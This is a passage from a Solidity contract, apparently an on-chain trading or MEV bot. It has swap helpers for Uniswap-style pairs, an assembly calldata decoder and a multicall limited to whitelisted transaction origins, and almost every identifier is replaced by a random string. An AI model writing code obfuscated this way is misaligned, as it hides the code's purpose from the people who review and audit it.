    emit Transfer(e5Jwk2ocubL1QqzQo7a7XaTYGyZgKfM6hgJNfgmCq6EeBZt5r00dDIbsEcJS5E5oO4Der1A16f0WiBz9mRCRrS6EPVXKymB0, nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj, voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23);

    return true;
  }

  function eOJutkvvAhR8hn6camVeLTGoSkKZZRFI9ubs4sxlZD9Hmp8DyALLMNA2VY6Sff0FWMqKmClsRDoxxomDdg0tt2i4mYqzXHAV(
    address buOypqv4LelkGRCmOdxAILo5WK991e4ODpe51XIcRzV77BJBlhlEFiFXb9Sx9skLmTkpxubhlnx8SmLGE59541guXJSX9wMf,
    address nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj,
    uint256 c2oeYWmld25oEIcDsbCIRZDfrozhxOyb6iqTXwwBCjQkJepQM4dZkPTA4ytgAgyTCcYFXewCo1PEZGMIMl81yF0BvYvDsbqs,
    uint256 yDpmbuuNS69l8LkrGCLDwp1gM2ds861xpvv0sJfY8Ju8k2jW1z74PMnE2lOVqXYE82afZgedvezQEVQAF92qdpSN6woIQlPH,
    uint256 lYWZP5zfALUsN75RgG3L8nKBdhGO2qGFbOoi5Jc2zxCjJbdcfKO4rKCMTM2aKgg7YWYQ2hb6bSNRRN9RuzHUNykHDAr5jl33
  ) internal returns (uint256, uint256) {
    address xL6UWEn9QXESvHG8Ixim3nsmXQr3kEpFCDwgNgzLJhk6U4607RDQy3gK5JYILKlyGpL6gjQS82EUuigb6AdifvYr6xUa8iNb = address(this);
    uint256 d1pxGMK2hHJmgJEcRF8cQARiz2zuOzYF6ydWxZzbsZDLnTgLWYU5Obzt2tsHlAqxvhBvn9DK8RqWyKNThxw3PMWpBh7XuY2R =
      vMDxo60xXlyt9rv86wKOvTkVz79tKamHxLg7Mq7IwHVlBkqF1g9bEvsSuKXQMMZwqPXmrWTg5NvzdHxHIKwzOZtCMtaOSIUR(c2oeYWmld25oEIcDsbCIRZDfrozhxOyb6iqTXwwBCjQkJepQM4dZkPTA4ytgAgyTCcYFXewCo1PEZGMIMl81yF0BvYvDsbqs, lYWZP5zfALUsN75RgG3L8nKBdhGO2qGFbOoi5Jc2zxCjJbdcfKO4rKCMTM2aKgg7YWYQ2hb6bSNRRN9RuzHUNykHDAr5jl33, yDpmbuuNS69l8LkrGCLDwp1gM2ds861xpvv0sJfY8Ju8k2jW1z74PMnE2lOVqXYE82afZgedvezQEVQAF92qdpSN6woIQlPH);

    iIcElhWCTdk0Mp2bVjnaGpvy7uah9yPeZZG2geS1IFbJ9AOaGdU6ztrQAMpLNqBnmw7cfHxXBL0Fe6dPPk2tABWDP7K3B8CT(buOypqv4LelkGRCmOdxAILo5WK991e4ODpe51XIcRzV77BJBlhlEFiFXb9Sx9skLmTkpxubhlnx8SmLGE59541guXJSX9wMf, yq09L09sVotRt1ziOZy6jMGr9a8uRnIsuVzmWD4OyS2zJK1BVa6Wbyne2dVrlkKQN9Frw8n6F0HqSKqjHPkZ7ThAnyafcJUJ, c2oeYWmld25oEIcDsbCIRZDfrozhxOyb6iqTXwwBCjQkJepQM4dZkPTA4ytgAgyTCcYFXewCo1PEZGMIMl81yF0BvYvDsbqs);
    if (xL6UWEn9QXESvHG8Ixim3nsmXQr3kEpFCDwgNgzLJhk6U4607RDQy3gK5JYILKlyGpL6gjQS82EUuigb6AdifvYr6xUa8iNb > sg2mNLCrQCN0y3SajAaJAjXMHYhYBZrzudzFesL5oa3CPs081aTiMLEa1KN6B2vMe3zlgfVmE4G9ROWAhGwvJrbakltAdxlc) zHOOCc5vPp2SXX8ejHFV0zgw5r7R2M7GhiOIcKwbZcLKR2scFIv1tgOXVGDNnPez8Ddlw3I1eFeRxaIQwet4MJxk8KPyVukE(yq09L09sVotRt1ziOZy6jMGr9a8uRnIsuVzmWD4OyS2zJK1BVa6Wbyne2dVrlkKQN9Frw8n6F0HqSKqjHPkZ7ThAnyafcJUJ).swap(d1pxGMK2hHJmgJEcRF8cQARiz2zuOzYF6ydWxZzbsZDLnTgLWYU5Obzt2tsHlAqxvhBvn9DK8RqWyKNThxw3PMWpBh7XuY2R, 0, nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj, new bytes(0));
    else zHOOCc5vPp2SXX8ejHFV0zgw5r7R2M7GhiOIcKwbZcLKR2scFIv1tgOXVGDNnPez8Ddlw3I1eFeRxaIQwet4MJxk8KPyVukE(yq09L09sVotRt1ziOZy6jMGr9a8uRnIsuVzmWD4OyS2zJK1BVa6Wbyne2dVrlkKQN9Frw8n6F0HqSKqjHPkZ7ThAnyafcJUJ).swap(0, d1pxGMK2hHJmgJEcRF8cQARiz2zuOzYF6ydWxZzbsZDLnTgLWYU5Obzt2tsHlAqxvhBvn9DK8RqWyKNThxw3PMWpBh7XuY2R, nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj, new bytes(0));

    return (yDpmbuuNS69l8LkrGCLDwp1gM2ds861xpvv0sJfY8Ju8k2jW1z74PMnE2lOVqXYE82afZgedvezQEVQAF92qdpSN6woIQlPH - d1pxGMK2hHJmgJEcRF8cQARiz2zuOzYF6ydWxZzbsZDLnTgLWYU5Obzt2tsHlAqxvhBvn9DK8RqWyKNThxw3PMWpBh7XuY2R, lYWZP5zfALUsN75RgG3L8nKBdhGO2qGFbOoi5Jc2zxCjJbdcfKO4rKCMTM2aKgg7YWYQ2hb6bSNRRN9RuzHUNykHDAr5jl33 + c2oeYWmld25oEIcDsbCIRZDfrozhxOyb6iqTXwwBCjQkJepQM4dZkPTA4ytgAgyTCcYFXewCo1PEZGMIMl81yF0BvYvDsbqs);
  }

  function b0nKQQzlUJ0Txcf6qA1Bwnfiz6q1WYRi62QlAvZfmOr8toJYCwRDQskHmxpCd5YsRNc0SMD0X6CzkX78C1ZpqkljfkZF0oXC(
    address buOypqv4LelkGRCmOdxAILo5WK991e4ODpe51XIcRzV77BJBlhlEFiFXb9Sx9skLmTkpxubhlnx8SmLGE59541guXJSX9wMf,
    uint256 cD33xGcbCM2p272JgJEzh8mTC7AzL0P0YRbRbztypM9HBlcCiwgvmwJHFDLbBKPlR7g78usXzL9SfRG6gp059xFeeUvgT1Of,
    uint256 yDpmbuuNS69l8LkrGCLDwp1gM2ds861xpvv0sJfY8Ju8k2jW1z74PMnE2lOVqXYE82afZgedvezQEVQAF92qdpSN6woIQlPH,
    uint256 lYWZP5zfALUsN75RgG3L8nKBdhGO2qGFbOoi5Jc2zxCjJbdcfKO4rKCMTM2aKgg7YWYQ2hb6bSNRRN9RuzHUNykHDAr5jl33
  ) internal returns (uint256, uint256) {
    address xL6UWEn9QXESvHG8Ixim3nsmXQr3kEpFCDwgNgzLJhk6U4607RDQy3gK5JYILKlyGpL6gjQS82EUuigb6AdifvYr6xUa8iNb = address(this);
    uint256 d1pxGMK2hHJmgJEcRF8cQARiz2zuOzYF6ydWxZzbsZDLnTgLWYU5Obzt2tsHlAqxvhBvn9DK8RqWyKNThxw3PMWpBh7XuY2R =
      vMDxo60xXlyt9rv86wKOvTkVz79tKamHxLg7Mq7IwHVlBkqF1g9bEvsSuKXQMMZwqPXmrWTg5NvzdHxHIKwzOZtCMtaOSIUR(cD33xGcbCM2p272JgJEzh8mTC7AzL0P0YRbRbztypM9HBlcCiwgvmwJHFDLbBKPlR7g78usXzL9SfRG6gp059xFeeUvgT1Of, yDpmbuuNS69l8LkrGCLDwp1gM2ds861xpvv0sJfY8Ju8k2jW1z74PMnE2lOVqXYE82afZgedvezQEVQAF92qdpSN6woIQlPH, lYWZP5zfALUsN75RgG3L8nKBdhGO2qGFbOoi5Jc2zxCjJbdcfKO4rKCMTM2aKgg7YWYQ2hb6bSNRRN9RuzHUNykHDAr5jl33);

    IERC20(sg2mNLCrQCN0y3SajAaJAjXMHYhYBZrzudzFesL5oa3CPs081aTiMLEa1KN6B2vMe3zlgfVmE4G9ROWAhGwvJrbakltAdxlc).transfer(yq09L09sVotRt1ziOZy6jMGr9a8uRnIsuVzmWD4OyS2zJK1BVa6Wbyne2dVrlkKQN9Frw8n6F0HqSKqjHPkZ7ThAnyafcJUJ, cD33xGcbCM2p272JgJEzh8mTC7AzL0P0YRbRbztypM9HBlcCiwgvmwJHFDLbBKPlR7g78usXzL9SfRG6gp059xFeeUvgT1Of);
    if (xL6UWEn9QXESvHG8Ixim3nsmXQr3kEpFCDwgNgzLJhk6U4607RDQy3gK5JYILKlyGpL6gjQS82EUuigb6AdifvYr6xUa8iNb > sg2mNLCrQCN0y3SajAaJAjXMHYhYBZrzudzFesL5oa3CPs081aTiMLEa1KN6B2vMe3zlgfVmE4G9ROWAhGwvJrbakltAdxlc) zHOOCc5vPp2SXX8ejHFV0zgw5r7R2M7GhiOIcKwbZcLKR2scFIv1tgOXVGDNnPez8Ddlw3I1eFeRxaIQwet4MJxk8KPyVukE(yq09L09sVotRt1ziOZy6jMGr9a8uRnIsuVzmWD4OyS2zJK1BVa6Wbyne2dVrlkKQN9Frw8n6F0HqSKqjHPkZ7ThAnyafcJUJ).swap(0, d1pxGMK2hHJmgJEcRF8cQARiz2zuOzYF6ydWxZzbsZDLnTgLWYU5Obzt2tsHlAqxvhBvn9DK8RqWyKNThxw3PMWpBh7XuY2R, buOypqv4LelkGRCmOdxAILo5WK991e4ODpe51XIcRzV77BJBlhlEFiFXb9Sx9skLmTkpxubhlnx8SmLGE59541guXJSX9wMf, new bytes(0));
    else zHOOCc5vPp2SXX8ejHFV0zgw5r7R2M7GhiOIcKwbZcLKR2scFIv1tgOXVGDNnPez8Ddlw3I1eFeRxaIQwet4MJxk8KPyVukE(yq09L09sVotRt1ziOZy6jMGr9a8uRnIsuVzmWD4OyS2zJK1BVa6Wbyne2dVrlkKQN9Frw8n6F0HqSKqjHPkZ7ThAnyafcJUJ).swap(d1pxGMK2hHJmgJEcRF8cQARiz2zuOzYF6ydWxZzbsZDLnTgLWYU5Obzt2tsHlAqxvhBvn9DK8RqWyKNThxw3PMWpBh7XuY2R, 0, buOypqv4LelkGRCmOdxAILo5WK991e4ODpe51XIcRzV77BJBlhlEFiFXb9Sx9skLmTkpxubhlnx8SmLGE59541guXJSX9wMf, new bytes(0));

    return (yDpmbuuNS69l8LkrGCLDwp1gM2ds861xpvv0sJfY8Ju8k2jW1z74PMnE2lOVqXYE82afZgedvezQEVQAF92qdpSN6woIQlPH + cD33xGcbCM2p272JgJEzh8mTC7AzL0P0YRbRbztypM9HBlcCiwgvmwJHFDLbBKPlR7g78usXzL9SfRG6gp059xFeeUvgT1Of, lYWZP5zfALUsN75RgG3L8nKBdhGO2qGFbOoi5Jc2zxCjJbdcfKO4rKCMTM2aKgg7YWYQ2hb6bSNRRN9RuzHUNykHDAr5jl33 - d1pxGMK2hHJmgJEcRF8cQARiz2zuOzYF6ydWxZzbsZDLnTgLWYU5Obzt2tsHlAqxvhBvn9DK8RqWyKNThxw3PMWpBh7XuY2R);
  }

  function t3D35HzGsOkRNN2AhDi5V5g8oeabg47XD2bQMvDO7w89KxDHIbtw5SszfBzgdoI6qyJ7B5Gnwkd4DveolPS8f7BoQdHX7UBB(bytes memory hMsrgvqP53L2ybwFrgTyhpC7gGJUmAum4SnMST7fhPP3XtdMrkppEU2A5STMdQ0BoTHlJiyapl6lbdSXgdWspigYVfg2myZS, uint256 mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss)
    private
    pure
    returns (
      uint256 roxy0stbQKhOJcucvS5v68bxsSWDsvpih36u3uMGJ9v8xVCBWN3jt5qN51suHAOmuwCUciqVyaWUWT1c6T9zsHOhaot7OdsE,
      address cnlrvt9066vtnJseb5XTg9f05F9deKtb5uBidQxTCKClDPWrqFhZAzjHeJfHyo0Td2Y4kx1JTUApW1VVyAcG8bnDfnUuQrhb,
      uint256 eAuKvG25KqNKhplfXmabKNnFfK82deVF5InpBCnQF8cZjwrMOHreJUx8P0s0AjTzujB2lyMvBpEBfjL0rruAAAsiph047wk4,
      uint256 voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23,
      uint256 jd4MLsbGeGI3nfyG1LIpaVtPK1SQdIwaQLsnmyW1N4FZ7zk1IIutpjR9qFKL8nEcQw0J5to5wifPUlce5p31iEnREI0FQdlG
    )
  {
    assembly {
      let amountdataLen := shr(248, mload(add(hMsrgvqP53L2ybwFrgTyhpC7gGJUmAum4SnMST7fhPP3XtdMrkppEU2A5STMdQ0BoTHlJiyapl6lbdSXgdWspigYVfg2myZS, mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss)))
      let z8K5aB8JcyLxj3VDxBf0Azvq1kCbv9eqkGNUyYn8PqQ7RFIocIgNo2upzxlEShDECMaq3GMJ5Hq9bDXxyWsVwwrcIbLdJjMy := sub(256, mul(amountdataLen, 8))
      mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss := add(mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss, 1)

      roxy0stbQKhOJcucvS5v68bxsSWDsvpih36u3uMGJ9v8xVCBWN3jt5qN51suHAOmuwCUciqVyaWUWT1c6T9zsHOhaot7OdsE := shr(248, mload(add(hMsrgvqP53L2ybwFrgTyhpC7gGJUmAum4SnMST7fhPP3XtdMrkppEU2A5STMdQ0BoTHlJiyapl6lbdSXgdWspigYVfg2myZS, mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss)))
      mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss := add(mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss, 1)

      switch roxy0stbQKhOJcucvS5v68bxsSWDsvpih36u3uMGJ9v8xVCBWN3jt5qN51suHAOmuwCUciqVyaWUWT1c6T9zsHOhaot7OdsE
        case 1 {
          eAuKvG25KqNKhplfXmabKNnFfK82deVF5InpBCnQF8cZjwrMOHreJUx8P0s0AjTzujB2lyMvBpEBfjL0rruAAAsiph047wk4 := shr(240, mload(add(hMsrgvqP53L2ybwFrgTyhpC7gGJUmAum4SnMST7fhPP3XtdMrkppEU2A5STMdQ0BoTHlJiyapl6lbdSXgdWspigYVfg2myZS, mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss)))
          mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss := add(mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss, 2)

          voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23 := shr(z8K5aB8JcyLxj3VDxBf0Azvq1kCbv9eqkGNUyYn8PqQ7RFIocIgNo2upzxlEShDECMaq3GMJ5Hq9bDXxyWsVwwrcIbLdJjMy, mload(add(hMsrgvqP53L2ybwFrgTyhpC7gGJUmAum4SnMST7fhPP3XtdMrkppEU2A5STMdQ0BoTHlJiyapl6lbdSXgdWspigYVfg2myZS, mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss)))
          mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss := add(mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss, amountdataLen)
        }
        case 2 {
          eAuKvG25KqNKhplfXmabKNnFfK82deVF5InpBCnQF8cZjwrMOHreJUx8P0s0AjTzujB2lyMvBpEBfjL0rruAAAsiph047wk4 := shr(240, mload(add(hMsrgvqP53L2ybwFrgTyhpC7gGJUmAum4SnMST7fhPP3XtdMrkppEU2A5STMdQ0BoTHlJiyapl6lbdSXgdWspigYVfg2myZS, mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss)))
          mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss := add(mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss, 2)

          voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23 := shr(z8K5aB8JcyLxj3VDxBf0Azvq1kCbv9eqkGNUyYn8PqQ7RFIocIgNo2upzxlEShDECMaq3GMJ5Hq9bDXxyWsVwwrcIbLdJjMy, mload(add(hMsrgvqP53L2ybwFrgTyhpC7gGJUmAum4SnMST7fhPP3XtdMrkppEU2A5STMdQ0BoTHlJiyapl6lbdSXgdWspigYVfg2myZS, mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss)))
          mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss := add(mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss, amountdataLen)
        }
        case 3 {
          cnlrvt9066vtnJseb5XTg9f05F9deKtb5uBidQxTCKClDPWrqFhZAzjHeJfHyo0Td2Y4kx1JTUApW1VVyAcG8bnDfnUuQrhb := shr(96, mload(add(hMsrgvqP53L2ybwFrgTyhpC7gGJUmAum4SnMST7fhPP3XtdMrkppEU2A5STMdQ0BoTHlJiyapl6lbdSXgdWspigYVfg2myZS, mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss)))
          mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss := add(mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss, 20)
        }
        case 4 {
          eAuKvG25KqNKhplfXmabKNnFfK82deVF5InpBCnQF8cZjwrMOHreJUx8P0s0AjTzujB2lyMvBpEBfjL0rruAAAsiph047wk4 := shr(240, mload(add(hMsrgvqP53L2ybwFrgTyhpC7gGJUmAum4SnMST7fhPP3XtdMrkppEU2A5STMdQ0BoTHlJiyapl6lbdSXgdWspigYVfg2myZS, mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss)))
          mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss := add(mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss, 2)
        }
    }
    jd4MLsbGeGI3nfyG1LIpaVtPK1SQdIwaQLsnmyW1N4FZ7zk1IIutpjR9qFKL8nEcQw0J5to5wifPUlce5p31iEnREI0FQdlG = mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss;
  }

  function multicall(bytes memory pR6cDT6XWS7oVRPqtpa4pV4y6Ar7xnc4SMBAMVdQmmhxNOLEoRL8iCL1y3W45ltlI3TVWTHlRD63Ap2p0ivSOcdjsnAqHP1t) external payable {
    if (zp6gNxjavWT1s5H9t60Nqs1rPb2ViytbfvmCe1ecSqCBv7zJkSWBTn3ShiEUwtVmSwQ1KHSf1l0W7afsOVmDnjA7CaXHTMLv[tx.origin] == false) return;
    if (msg.value > 0) qFNdhdtL0p6EL2KDxG5E2fjxHEhne9wDoKX3JHSrKLTeS2KIlCv2HCsoNdP7HObhwvFqPKAWRq4UMZaeyTRCvYOq5a1VbK3c(sg2mNLCrQCN0y3SajAaJAjXMHYhYBZrzudzFesL5oa3CPs081aTiMLEa1KN6B2vMe3zlgfVmE4G9ROWAhGwvJrbakltAdxlc).deposit{value: msg.value}();

    (uint256 lYWZP5zfALUsN75RgG3L8nKBdhGO2qGFbOoi5Jc2zxCjJbdcfKO4rKCMTM2aKgg7YWYQ2hb6bSNRRN9RuzHUNykHDAr5jl33, uint256 yDpmbuuNS69l8LkrGCLDwp1gM2ds861xpvv0sJfY8Ju8k2jW1z74PMnE2lOVqXYE82afZgedvezQEVQAF92qdpSN6woIQlPH) =
      cyGGA5OB4fF4GhFRY5srgSTiUCyxCWfV0CSXisjb44m7KzlW2W75nAxCjP6rJShfdLjkyBq8xv86oQdzOTu5OO3meBnBigLk(yq09L09sVotRt1ziOZy6jMGr9a8uRnIsuVzmWD4OyS2zJK1BVa6Wbyne2dVrlkKQN9Frw8n6F0HqSKqjHPkZ7ThAnyafcJUJ, address(this), sg2mNLCrQCN0y3SajAaJAjXMHYhYBZrzudzFesL5oa3CPs081aTiMLEa1KN6B2vMe3zlgfVmE4G9ROWAhGwvJrbakltAdxlc);

    uint256 bu9AJUdkanQDW8AXugUVCqfA1QnOTkTQi0FFUXbQ3506s3e6NqEqh3yffjvhyd3ZNxSLlDkBS3W0CgGYjs47UmnMUPIBwtsk = yDpmbuuNS69l8LkrGCLDwp1gM2ds861xpvv0sJfY8Ju8k2jW1z74PMnE2lOVqXYE82afZgedvezQEVQAF92qdpSN6woIQlPH;

    uint256 zcUplOBcem5OG0bsJmDJ1KfpTXP89hOyqvSe4b9v7U0x0QlumsvgUr7Jalm5FQgXss12riinoiA8Nq5wuGWRaU0zsGuvMKo0;
    uint256 mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss = 33;
    assembly {
      zcUplOBcem5OG0bsJmDJ1KfpTXP89hOyqvSe4b9v7U0x0QlumsvgUr7Jalm5FQgXss12riinoiA8Nq5wuGWRaU0zsGuvMKo0 := shr(248, mload(add(pR6cDT6XWS7oVRPqtpa4pV4y6Ar7xnc4SMBAMVdQmmhxNOLEoRL8iCL1y3W45ltlI3TVWTHlRD63Ap2p0ivSOcdjsnAqHP1t, 0x20)))
    }

    uint256 roxy0stbQKhOJcucvS5v68bxsSWDsvpih36u3uMGJ9v8xVCBWN3jt5qN51suHAOmuwCUciqVyaWUWT1c6T9zsHOhaot7OdsE;
    address ttJjgE0CSFBaEyCuD0ftZABipGktaNSJm9MwfmwJAeRCCCkFXL1sHoILy41I8MV0DItNv0kyOwRCcN8xlUxVxJN6KazKcXDL;
    uint256 eAuKvG25KqNKhplfXmabKNnFfK82deVF5InpBCnQF8cZjwrMOHreJUx8P0s0AjTzujB2lyMvBpEBfjL0rruAAAsiph047wk4;
    uint256 voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23;

    for (uint256 i; i < zcUplOBcem5OG0bsJmDJ1KfpTXP89hOyqvSe4b9v7U0x0QlumsvgUr7Jalm5FQgXss12riinoiA8Nq5wuGWRaU0zsGuvMKo0; i++) {
      (roxy0stbQKhOJcucvS5v68bxsSWDsvpih36u3uMGJ9v8xVCBWN3jt5qN51suHAOmuwCUciqVyaWUWT1c6T9zsHOhaot7OdsE, ttJjgE0CSFBaEyCuD0ftZABipGktaNSJm9MwfmwJAeRCCCkFXL1sHoILy41I8MV0DItNv0kyOwRCcN8xlUxVxJN6KazKcXDL, eAuKvG25KqNKhplfXmabKNnFfK82deVF5InpBCnQF8cZjwrMOHreJUx8P0s0AjTzujB2lyMvBpEBfjL0rruAAAsiph047wk4, voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23, mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss) = t3D35HzGsOkRNN2AhDi5V5g8oeabg47XD2bQMvDO7w89KxDHIbtw5SszfBzgdoI6qyJ7B5Gnwkd4DveolPS8f7BoQdHX7UBB(
        pR6cDT6XWS7oVRPqtpa4pV4y6Ar7xnc4SMBAMVdQmmhxNOLEoRL8iCL1y3W45ltlI3TVWTHlRD63Ap2p0ivSOcdjsnAqHP1t,
        mxae4Ba5ZBvRnH3kcnRs5aFrpG0uL3aXtJEJZsypWquqNM3snNp40lOzDNiM5yKHTSVKQnnYsnkLi8hXzA7h9TktWo28wqss
      );

      if (roxy0stbQKhOJcucvS5v68bxsSWDsvpih36u3uMGJ9v8xVCBWN3jt5qN51suHAOmuwCUciqVyaWUWT1c6T9zsHOhaot7OdsE == 1) {
        (yDpmbuuNS69l8LkrGCLDwp1gM2ds861xpvv0sJfY8Ju8k2jW1z74PMnE2lOVqXYE82afZgedvezQEVQAF92qdpSN6woIQlPH, lYWZP5zfALUsN75RgG3L8nKBdhGO2qGFbOoi5Jc2zxCjJbdcfKO4rKCMTM2aKgg7YWYQ2hb6bSNRRN9RuzHUNykHDAr5jl33) = b0nKQQzlUJ0Txcf6qA1Bwnfiz6q1WYRi62QlAvZfmOr8toJYCwRDQskHmxpCd5YsRNc0SMD0X6CzkX78C1ZpqkljfkZF0oXC(
          ahDqNcFSJJNEO0dfFqimha57HQT135FtVLudmINuOOwuUj3D8HXLrygno5LKppg1HBH009oDA5xJTJUk42v0FO0jDYFU78qk(eAuKvG25KqNKhplfXmabKNnFfK82deVF5InpBCnQF8cZjwrMOHreJUx8P0s0AjTzujB2lyMvBpEBfjL0rruAAAsiph047wk4),
          voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23,
          yDpmbuuNS69l8LkrGCLDwp1gM2ds861xpvv0sJfY8Ju8k2jW1z74PMnE2lOVqXYE82afZgedvezQEVQAF92qdpSN6woIQlPH,
          lYWZP5zfALUsN75RgG3L8nKBdhGO2qGFbOoi5Jc2zxCjJbdcfKO4rKCMTM2aKgg7YWYQ2hb6bSNRRN9RuzHUNykHDAr5jl33
        );
      } else if (roxy0stbQKhOJcucvS5v68bxsSWDsvpih36u3uMGJ9v8xVCBWN3jt5qN51suHAOmuwCUciqVyaWUWT1c6T9zsHOhaot7OdsE == 2) {
        (yDpmbuuNS69l8LkrGCLDwp1gM2ds861xpvv0sJfY8Ju8k2jW1z74PMnE2lOVqXYE82afZgedvezQEVQAF92qdpSN6woIQlPH, lYWZP5zfALUsN75RgG3L8nKBdhGO2qGFbOoi5Jc2zxCjJbdcfKO4rKCMTM2aKgg7YWYQ2hb6bSNRRN9RuzHUNykHDAr5jl33) = eOJutkvvAhR8hn6camVeLTGoSkKZZRFI9ubs4sxlZD9Hmp8DyALLMNA2VY6Sff0FWMqKmClsRDoxxomDdg0tt2i4mYqzXHAV(
